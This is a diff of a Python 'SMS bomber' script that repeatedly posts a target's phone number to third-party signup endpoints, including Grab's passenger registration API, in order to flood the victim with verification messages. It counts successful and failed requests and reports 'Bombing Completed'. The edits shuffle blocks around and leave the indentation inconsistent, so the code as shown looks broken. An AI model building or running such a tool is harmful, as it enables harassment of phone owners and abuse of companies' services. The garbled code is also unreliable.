@@ -94,18 +94,30 @@ _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]
 _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
 
 
-
+        try:
+            failed = 0
+            requested = 0
+            success = int(requested) - int(failed)
+            result = getapi(_number)
+        except Exception:
+            result = False
+        if result:
+            success = success + 1
+        else:
+            failed = failed + 1
+            while ch.count(api) > 0:
+                ch.remove(api)
+        time.sleep(float(delay))
+        if requested % 3 == 0:
+            checkinternet()
+    print('\n\nBombing Completed..')
+    exit()
 
 
 
 iteration = 0
 
-            print("==================================================================")
-            print("             Target Number           : +" + " ", _number)
-            print("             Successful Requests     : ", success)
-            print("             Failed Requests         : ", failed)
-            print("             Number of Requests Sent : ", requested)
-            print("==================================================================")
+         
 
 
 while True:
@@ -116,7 +128,12 @@ while True:
 	try:
                 
 		requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
-		print('[+] Grab Requests Successful!')
+		print("===========================")
+                print("Target Number: +" + " ", _number)
+                print("Successful Requests: ", success)
+                print("Failed Requests: ", failed)
+                print("Number of Requests Sent: ", requested)
+                print("============================")
 	except:
 		print('[-] Grab Requests Failed!')
 
@@ -395,24 +412,7 @@ while True:
 	except:
 		pass
 
-        try:
-            failed = 0
-            requested = 0
-            success = int(requested) - int(failed)
-            result = getapi(_number)
-        except Exception:
-            result = False
-        if result:
-            success = success + 1
-        else:
-            failed = failed + 1
-            while ch.count(api) > 0:
-                ch.remove(api)
-        time.sleep(float(delay))
-        if requested % 3 == 0:
-            checkinternet()
-    print('\n\nBombing Completed..')
-    exit()
+
 
 		iteration += 1
 		print(' = {}completed tours '.format(iteration)) 
